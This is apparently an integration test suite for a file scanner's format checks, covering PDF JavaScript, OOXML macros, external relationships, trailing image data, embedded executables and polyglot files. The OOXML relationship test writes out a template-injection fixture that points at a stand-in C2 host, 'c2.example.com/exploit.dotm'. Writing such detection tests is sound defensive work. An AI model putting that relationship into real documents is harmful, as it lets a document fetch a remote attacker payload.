/**
 * @sug/test/integration/scanner/p17-format-checks
 * Integration test suite for Phase P17 Format Checks:
 * - scan-04: PDF Active Content Check
 * - scan-05: OOXML Macro Check
 * - scan-06: OOXML External Relationship Check
 * - Image Trailing Data Check
 * - Embedded Executable Signature Check
 * - Polyglot Detection Matrix (poly-01, poly-02, poly-03, poly-04 documented miss)
 * - P12 ArtifactIdentity binding validation
 * - scan_results idempotency per (scan_job_id, check_id)
 */

import { describe, it, expect, beforeAll, afterAll, beforeEach } from 'vitest';
import fs from 'node:fs';
import path from 'node:path';
import os from 'node:os';
import crypto from 'node:crypto';
import pg from 'pg';
import {
  S3Client,
  CreateBucketCommand,
  PutObjectCommand,
  HeadBucketCommand,
  PutBucketVersioningCommand,
} from '@aws-sdk/client-s3';
import { createPool, createBaseFixtures, type FixtureContext } from '../db/helpers.js';
import { createS3Provider, type StorageProvider } from '@sug/storage';
import { ScannerWorker } from '../../../services/scanner/src/worker.js';
import {
  createCleanPdfBuffer,
  createActiveContentPdfBuffer,
  createTrailingPngBuffer,
  createEmbeddedPeBuffer,
  createMinimalZipBuffer,
  createGifZipPolyglotBuffer,
  createJpegZipPolyglotBuffer,
  createPdfZipPolyglotBuffer,
  createAdvancedPolyglotBuffer,
} from '../../fixtures/format-fixtures.js';

const S3_ENDPOINT = process.env.S3_ENDPOINT || 'http://localhost:4566';
const S3_QUARANTINE_BUCKET = 'sug-quarantine-local';

describe('Phase P17: Format Checks & Findings Persistence DoD Suite', () => {
  let adminPool: pg.Pool;
  let scannerPool: pg.Pool;
  let fixtures: FixtureContext;
  let rawS3: S3Client;
  let storageProvider: StorageProvider;
  const testTmpDir = path.join(os.tmpdir(), `sug-p17-test-${crypto.randomUUID().slice(0, 8)}`);

  beforeAll(async () => {
    adminPool = createPool('sug_admin', 'sug_dev_password');
    scannerPool = createPool('sug_scanner', 'sug_scanner_dev_password', 10);
    fixtures = await createBaseFixtures(adminPool);

    rawS3 = new S3Client({
      endpoint: S3_ENDPOINT,
      region: 'us-east-1',
      credentials: {
        accessKeyId: 'test',
        secretAccessKey: 'test',
      },
      forcePathStyle: true,
    });

    // Ensure S3 bucket exists with versioning enabled
    let s3Ready = false;
    for (let attempt = 0; attempt < 15; attempt++) {
      try {
        try {
          await rawS3.send(new HeadBucketCommand({ Bucket: S3_QUARANTINE_BUCKET }));
        } catch {
          await rawS3.send(new CreateBucketCommand({ Bucket: S3_QUARANTINE_BUCKET }));
        }
        await rawS3.send(
          new PutBucketVersioningCommand({
            Bucket: S3_QUARANTINE_BUCKET,
            VersioningConfiguration: { Status: 'Enabled' },
          }),
        );
        s3Ready = true;
        break;
      } catch {
        await new Promise((resolve) => setTimeout(resolve, 1000));
      }
    }

    if (!s3Ready) {
      throw new Error(`Could not connect to LocalStack S3 emulator at ${S3_ENDPOINT}`);
    }

    storageProvider = createS3Provider({
      endpoint: S3_ENDPOINT,
      region: 'us-east-1',
      credentials: {
        accessKeyId: 'test',
        secretAccessKey: 'test',
      },
      forcePathStyle: true,
    });

    await fs.promises.mkdir(testTmpDir, { recursive: true });
  }, 30000);

  beforeEach(async () => {
    await adminPool.query(
      `DELETE FROM scan_jobs WHERE id NOT IN (SELECT scan_job_id FROM scan_results WHERE scan_job_id IS NOT NULL)`,
    );
    await adminPool.query(
      `UPDATE scan_jobs SET status = 'SUCCEEDED' WHERE status IN ('QUEUED', 'RUNNING')`,
    );
  });

  afterAll(async () => {
    try {
      await fs.promises.rm(testTmpDir, { recursive: true, force: true });
    } catch {
      // ignore
    }
    if (scannerPool) await scannerPool.end();
    if (adminPool) await adminPool.end();
  });

  async function putTestObject(content: Buffer, customFilename?: string) {
    const filename = customFilename ?? 'test-file.bin';
    const key = `quarantine/${fixtures.appId}/${crypto.randomUUID()}/${filename}`;
    const sha256 = crypto.createHash('sha256').update(content).digest('hex').toLowerCase();
    const size = content.length;

    const putRes = await rawS3.send(
      new PutObjectCommand({
        Bucket: S3_QUARANTINE_BUCKET,
        Key: key,
        Body: content,
      }),
    );

    if (!putRes.VersionId) {
      throw new Error('S3 put did not return VersionId');
    }

    return {
      key,
      versionId: putRes.VersionId,
      sha256,
      size,
      buffer: content,
    };
  }

  async function createScanJobFixture(params: {
    objectKey: string;
    storageVersionId: string;
    sizeBytes: number;
    sha256Ingest: string;
  }) {
    const fileVersionId = crypto.randomUUID();
    const jobId = crypto.randomUUID();
    const ingestShaBuffer = Buffer.from(params.sha256Ingest, 'hex');

    await adminPool.query(
      `INSERT INTO file_versions (
         id, file_id, version_no, provider, bucket, object_key,
         storage_version_id, size_bytes, sha256_ingest
       ) VALUES ($1, $2, (SELECT COALESCE(MAX(version_no), 0) + 1 FROM file_versions WHERE file_id = $2),
                 'aws', $3, $4, $5, $6, $7)`,
      [
        fileVersionId,
        fixtures.fileId,
        S3_QUARANTINE_BUCKET,
        params.objectKey,
        params.storageVersionId,
        params.sizeBytes,
        ingestShaBuffer,
      ],
    );

    await adminPool.query(
      `INSERT INTO scan_jobs (id, file_version_id, status, max_attempts, run_after)
       VALUES ($1, $2, 'QUEUED', 3, NOW() - INTERVAL '1 second')`,
      [jobId, fileVersionId],
    );

    return { fileVersionId, jobId };
  }

  it('scan-04: detects PDF active content and persists findings with ArtifactIdentity', async () => {
    const activePdf = createActiveContentPdfBuffer('javascript');
    const obj = await putTestObject(activePdf, 'document.pdf');
    const { jobId } = await createScanJobFixture({
      objectKey: obj.key,
      storageVersionId: obj.versionId,
      sizeBytes: obj.size,
      sha256Ingest: obj.sha256,
    });

    const worker = new ScannerWorker({
      db: scannerPool,
      storageProvider,
      enableClamAv: false,
      enableYara: false,
      enableArchive: false,
      enableFormatChecks: true,
      tempDir: testTmpDir,
    });

    const { job, result } = await worker.runOnce();
    expect(job?.id).toBe(jobId);
    expect(result?.success).toBe(true);
    expect(result?.pdf?.outcome).toBe('FAIL');
    expect(result?.pdf?.reasonCode).toBe('ACTIVE_CONTENT_DETECTED');

    // Assert scan_results record
    const dbRes = await scannerPool.query(
      `SELECT check_id, outcome, reason_code, severity, confidence,
              scanned_storage_version_id, scanned_sha256, scanned_size
       FROM scan_results
       WHERE scan_job_id = $1 AND check_id = 'scanner.pdf'`,
      [jobId],
    );

    expect(dbRes.rows).toHaveLength(1);
    const row = dbRes.rows[0]!;
    expect(row.check_id).toBe('scanner.pdf');
    expect(row.outcome).toBe('FAIL');
    expect(row.reason_code).toBe('ACTIVE_CONTENT_DETECTED');
    expect(row.severity).toBe('HIGH');
    expect(row.confidence).toBe('CONFIRMED');

    // ArtifactIdentity assertions
    expect(row.scanned_storage_version_id).toBe(obj.versionId);
    expect(row.scanned_sha256.toString('hex')).toBe(obj.sha256);
    expect(Number(row.scanned_size)).toBe(obj.size);
  });

  it('scan-05: detects OOXML macro and persists findings with ArtifactIdentity', async () => {
    const macroZip = createMinimalZipBuffer('word/vbaProject.bin', 'DUMMY_VBA_BIN');
    const obj = await putTestObject(macroZip, 'document.docm');
    const { jobId } = await createScanJobFixture({
      objectKey: obj.key,
      storageVersionId: obj.versionId,
      sizeBytes: obj.size,
      sha256Ingest: obj.sha256,
    });

    const worker = new ScannerWorker({
      db: scannerPool,
      storageProvider,
      enableClamAv: false,
      enableYara: false,
      enableArchive: false,
      enableFormatChecks: true,
      tempDir: testTmpDir,
    });

    const { job, result } = await worker.runOnce();
    expect(job?.id).toBe(jobId);
    expect(result?.success).toBe(true);
    expect(result?.ooxmlMacro?.outcome).toBe('FAIL');
    expect(result?.ooxmlMacro?.reasonCode).toBe('OOXML_MACRO_DETECTED');

    const dbRes = await scannerPool.query(
      `SELECT check_id, outcome, reason_code, severity, confidence,
              scanned_storage_version_id, scanned_sha256, scanned_size
       FROM scan_results
       WHERE scan_job_id = $1 AND check_id = 'scanner.ooxml.macro'`,
      [jobId],
    );

    expect(dbRes.rows).toHaveLength(1);
    const row = dbRes.rows[0]!;
    expect(row.outcome).toBe('FAIL');
    expect(row.reason_code).toBe('OOXML_MACRO_DETECTED');
    expect(row.scanned_storage_version_id).toBe(obj.versionId);
    expect(row.scanned_sha256.toString('hex')).toBe(obj.sha256);
  });

  it('scan-06: detects OOXML external relationships statically without network calls', async () => {
    const relsXml = `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://c2.example.com/exploit.dotm" TargetMode="External"/>
</Relationships>`;

    const relsZip = createMinimalZipBuffer('word/_rels/document.xml.rels', relsXml);
    const obj = await putTestObject(relsZip, 'external.docx');
    const { jobId } = await createScanJobFixture({
      objectKey: obj.key,
      storageVersionId: obj.versionId,
      sizeBytes: obj.size,
      sha256Ingest: obj.sha256,
    });

    const worker = new ScannerWorker({
      db: scannerPool,
      storageProvider,
      enableClamAv: false,
      enableYara: false,
      enableArchive: false,
      enableFormatChecks: true,
      tempDir: testTmpDir,
    });

    const { job, result } = await worker.runOnce();
    expect(job?.id).toBe(jobId);
    expect(result?.success).toBe(true);
    expect(result?.ooxmlRelationship?.outcome).toBe('FAIL');
    expect(result?.ooxmlRelationship?.reasonCode).toBe('OOXML_EXTERNAL_RELATIONSHIP');

    const dbRes = await scannerPool.query(
      `SELECT check_id, outcome, reason_code, severity, confidence, evidence
       FROM scan_results
       WHERE scan_job_id = $1 AND check_id = 'scanner.ooxml.relationship'`,
      [jobId],
    );

    expect(dbRes.rows).toHaveLength(1);
    const row = dbRes.rows[0]!;
    expect(row.outcome).toBe('FAIL');
    expect(row.reason_code).toBe('OOXML_EXTERNAL_RELATIONSHIP');
    expect(row.evidence.externalTargets[0].target).toBe('http://c2.example.com/exploit.dotm');
  });

  it('detects image trailing data and persists findings', async () => {
    const trailingPng = createTrailingPngBuffer();
    const obj = await putTestObject(trailingPng, 'image.png');
    const { jobId } = await createScanJobFixture({
      objectKey: obj.key,
      storageVersionId: obj.versionId,
      sizeBytes: obj.size,
      sha256Ingest: obj.sha256,
    });

    const worker = new ScannerWorker({
      db: scannerPool,
      storageProvider,
      enableClamAv: false,
      enableYara: false,
      enableArchive: false,
      enableFormatChecks: true,
      tempDir: testTmpDir,
    });

    const { job, result } = await worker.runOnce();
    expect(job?.id).toBe(jobId);
    expect(result?.success).toBe(true);
    expect(result?.imageTrailing?.outcome).toBe('FAIL');
    expect(result?.imageTrailing?.reasonCode).toBe('IMAGE_TRAILING_DATA_DETECTED');

    const dbRes = await scannerPool.query(
      `SELECT check_id, outcome, reason_code, severity, confidence
       FROM scan_results
       WHERE scan_job_id = $1 AND check_id = 'scanner.image.trailing'`,
      [jobId],
    );

    expect(dbRes.rows).toHaveLength(1);
    const row = dbRes.rows[0]!;
    expect(row.outcome).toBe('FAIL');
    expect(row.reason_code).toBe('IMAGE_TRAILING_DATA_DETECTED');
  });

  it('detects embedded PE executable header at non-zero offset', async () => {
    const embeddedPe = createEmbeddedPeBuffer(512);
    const obj = await putTestObject(embeddedPe, 'sample.bin');
    const { jobId } = await createScanJobFixture({
      objectKey: obj.key,
      storageVersionId: obj.versionId,
      sizeBytes: obj.size,
      sha256Ingest: obj.sha256,
    });

    const worker = new ScannerWorker({
      db: scannerPool,
      storageProvider,
      enableClamAv: false,
      enableYara: false,
      enableArchive: false,
      enableFormatChecks: true,
      tempDir: testTmpDir,
    });

    const { job, result } = await worker.runOnce();
    expect(job?.id).toBe(jobId);
    expect(result?.success).toBe(true);
    expect(result?.embeddedSig?.outcome).toBe('FAIL');
    expect(result?.embeddedSig?.reasonCode).toBe('EMBEDDED_EXECUTABLE_DETECTED');

    const dbRes = await scannerPool.query(
      `SELECT check_id, outcome, reason_code, severity, confidence
       FROM scan_results
       WHERE scan_job_id = $1 AND check_id = 'scanner.signature.embedded'`,
      [jobId],
    );

    expect(dbRes.rows).toHaveLength(1);
    const row = dbRes.rows[0]!;
    expect(row.outcome).toBe('FAIL');
    expect(row.reason_code).toBe('EMBEDDED_EXECUTABLE_DETECTED');
    expect(row.severity).toBe('CRITICAL');
  });

  it('polyglot matrix: poly-01, poly-02, poly-03 fail, poly-04 is documented miss', async () => {
    // 1. poly-01 GIF-ZIP
    const poly01 = createGifZipPolyglotBuffer();
    const obj01 = await putTestObject(poly01, 'poly01.gif');
    await createScanJobFixture({
      objectKey: obj01.key,
      storageVersionId: obj01.versionId,
      sizeBytes: obj01.size,
      sha256Ingest: obj01.sha256,
    });

    const worker = new ScannerWorker({
      db: scannerPool,
      storageProvider,
      enableClamAv: false,
      enableYara: false,
      enableArchive: false,
      enableFormatChecks: true,
      tempDir: testTmpDir,
    });

    const run01 = await worker.runOnce();
    expect(run01.result?.polyglot?.outcome).toBe('FAIL');
    expect(run01.result?.polyglot?.reasonCode).toBe('POLYGLOT_DETECTED');

    // 2. poly-02 JPEG-ZIP
    const poly02 = createJpegZipPolyglotBuffer();
    const obj02 = await putTestObject(poly02, 'poly02.jpg');
    await createScanJobFixture({
      objectKey: obj02.key,
      storageVersionId: obj02.versionId,
      sizeBytes: obj02.size,
      sha256Ingest: obj02.sha256,
    });

    const run02 = await worker.runOnce();
    expect(run02.result?.polyglot?.outcome).toBe('FAIL');
    expect(run02.result?.polyglot?.reasonCode).toBe('POLYGLOT_DETECTED');

    // 3. poly-03 PDF-ZIP
    const poly03 = createPdfZipPolyglotBuffer();
    const obj03 = await putTestObject(poly03, 'poly03.pdf');
    await createScanJobFixture({
      objectKey: obj03.key,
      storageVersionId: obj03.versionId,
      sizeBytes: obj03.size,
      sha256Ingest: obj03.sha256,
    });

    const run03 = await worker.runOnce();
    expect(run03.result?.polyglot?.outcome).toBe('FAIL');
    expect(run03.result?.polyglot?.reasonCode).toBe('POLYGLOT_DETECTED');

    // 4. poly-04 Advanced polyglot (documented miss)
    const poly04 = createAdvancedPolyglotBuffer();
    const obj04 = await putTestObject(poly04, 'poly04.bin');
    await createScanJobFixture({
      objectKey: obj04.key,
      storageVersionId: obj04.versionId,
      sizeBytes: obj04.size,
      sha256Ingest: obj04.sha256,
    });

    const run04 = await worker.runOnce();
    expect(run04.result?.polyglot?.outcome).toBe('PASS');
    expect(run04.result?.polyglot?.reasonCode).toBe('CLEAN');
  });

  it('enforces idempotency on (scan_job_id, check_id)', async () => {
    const cleanPdf = createCleanPdfBuffer();
    const obj = await putTestObject(cleanPdf, 'clean.pdf');
    const { jobId, fileVersionId } = await createScanJobFixture({
      objectKey: obj.key,
      storageVersionId: obj.versionId,
      sizeBytes: obj.size,
      sha256Ingest: obj.sha256,
    });

    const worker = new ScannerWorker({
      db: scannerPool,
      storageProvider,
      enableClamAv: false,
      enableYara: false,
      enableArchive: false,
      enableFormatChecks: true,
      tempDir: testTmpDir,
    });

    // Run first time
    await worker.runOnce();

    // Directly re-record finding for same checkId
    await expect(
      worker.recordFinding({
        jobId,
        fileVersionId,
        checkId: 'scanner.pdf',
        engine: 'pdf-scanner',
        outcome: 'PASS',
        reasonCode: 'CLEAN',
        severity: 'INFO',
        confidence: 'CONFIRMED',
        evidence: { retest: true },
        storageVersionId: obj.versionId,
        sha256Hex: obj.sha256,
        sizeBytes: obj.size,
        durationMs: 10,
      }),
    ).resolves.not.toThrow();

    const countRes = await scannerPool.query(
      `SELECT count(*)::int as count FROM scan_results WHERE scan_job_id = $1 AND check_id = 'scanner.pdf'`,
      [jobId],
    );
    expect(countRes.rows[0].count).toBe(1);
  });
});
